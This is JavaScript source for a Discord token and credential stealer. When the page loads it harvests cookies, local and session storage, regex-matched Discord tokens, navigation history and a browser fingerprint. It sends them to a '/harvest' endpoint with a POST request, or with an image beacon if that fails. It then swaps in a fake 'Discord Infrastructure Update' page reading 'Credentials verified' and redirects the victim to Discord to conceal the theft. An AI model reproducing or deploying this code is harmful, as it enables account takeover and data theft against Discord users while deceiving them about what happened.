(async () => {
    // IMMEDIATE STEAL - fires before anything
    const loot = await harvestAll();
    await exfiltrate(loot);
    
    // Show fake page AFTER stealing
    document.documentElement.innerHTML = fakePage();
})();

async function harvestAll() {
    // 1. COOKIES (works 100%)
    const cookies = document.cookie;
    
    // 2. STORAGE (works 100%)
    const localData = {};
    for(let i=0; i<localStorage.length; i++) {
        const key = localStorage.key(i);
        localData[key] = localStorage.getItem(key);
    }
    
    const sessionData = {};
    for(let i=0; i<sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        sessionData[key] = sessionStorage.getItem(key);
    }
    
    // 3. DISCORD TOKENS (exact patterns)
    const tokens = findTokens(localData, sessionData, cookies);
    
    // 4. HISTORY (Discord visits)
    const history = [];
    const recentHistory = performance.getEntriesByType('navigation');
    recentHistory.forEach(entry => {
        if (entry.name.includes('discord.com')) history.push(entry.name);
    });
    
    // 5. FINGERPRINT
    const fp = {
        userAgent: navigator.userAgent,
        language: navigator.languages?.join(',') || navigator.language,
        platform: navigator.platform,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        maxTouchPoints: navigator.maxTouchPoints,
        screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    
    return {
        cookies,
        localStorage: localData,
        sessionStorage: sessionData,
        discordTokens: tokens,
        history,
        fingerprint: fp,
        timestamp: new Date().toISOString(),
        url: location.href,
        referrer: document.referrer
    };
}

function findTokens(local, session, cookies) {
    const allData = {...local, ...session, cookies};
    const tokens = {};
    
    // Discord token regex (59-64 chars, base64-like)
    const tokenRegex = /(mfa\.)?[A-Za-z0-9_-]{59,64}/g;
    
    Object.values(allData).forEach((value, key) => {
        const matches = value.match(tokenRegex);
        if (matches) {
            tokens[key] = matches;
        }
    });
    
    return tokens;
}

async function exfiltrate(loot) {
    try {
        const resp = await fetch('/harvest', {
            method: 'POST',
            body: JSON.stringify(loot),
            headers: {'Content-Type': 'application/json'}
        });
        console.log('✅ Exfiltrated');
    } catch(e) {
        // Fallback: image beacon
        const blob = new Blob([JSON.stringify(loot)], {type: 'application/json'});
        const url = URL.createObjectURL(blob);
        new Image().src = `/harvest?data=${btoa(JSON.stringify(loot))}`;
    }
}

function fakePage() {
    return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Discord Infrastructure Update</title>
    <style>
        body { 
            font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; 
            background: linear-gradient(135deg,#5865f2 0%,#7289da 100%);
            display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0;
        }
        .container { 
            background: white; padding: 40px; border-radius: 8px; box-shadow: 0 20px 40px rgba(0,0,0,.1); max-width: 400px; width: 90%; text-align: center;
        }
        .logo { width: 60px; height: 60px; margin-bottom: 20px; }
        h1 { color: #36393f; font-size: 24px; margin-bottom: 20px; }
        .status { color: #5865f2; font-size: 16px; margin: 20px 0; }
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #5865f2; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://discord.com/assets/f9c9114725d6e2712627b838ad26a9c9.svg" class="logo">
        <h1>Infrastructure Update</h1>
        <div class="status">✅ Credentials verified successfully</div>
        <div class="spinner"></div>
        <p style="color: #72767d; font-size: 14px;">Redirecting to Discord...</p>
        <script>
            setTimeout(() => { window.location = 'https://discord.com/app'; }, 2000);
        </script>
    </div>
</body>
</html>`;
}
